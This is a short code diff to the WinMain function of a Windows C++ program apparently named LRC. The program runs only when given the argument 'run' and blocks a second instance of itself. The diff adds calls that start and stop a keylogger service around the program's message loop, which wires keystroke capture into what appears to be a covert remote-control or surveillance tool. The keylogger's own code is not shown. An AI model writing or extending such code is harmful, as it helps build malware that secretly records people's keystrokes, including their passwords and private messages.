@@ -5,8 +5,7 @@
 
 int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-
-#if !DEBUG
+#if !_DEBUG
 	if (strcmp("run", lpCmdLine) != 0)
 	{
 		// Stop LRC if comand line arguments are not equals to "run"
@@ -20,6 +19,9 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 		// Prevent LRC from multiple execution
 		return 0;
 	}
+
+	// Run keylogger service
+	services::keylogger::run();
 
 	// Windows message loop
 	MSG msg;
@@ -36,5 +38,8 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 			DispatchMessage(&msg);
 		}
 	}
+
+	// Stop keylogger service
+	services::keylogger::stop();
 	return 0;
 }
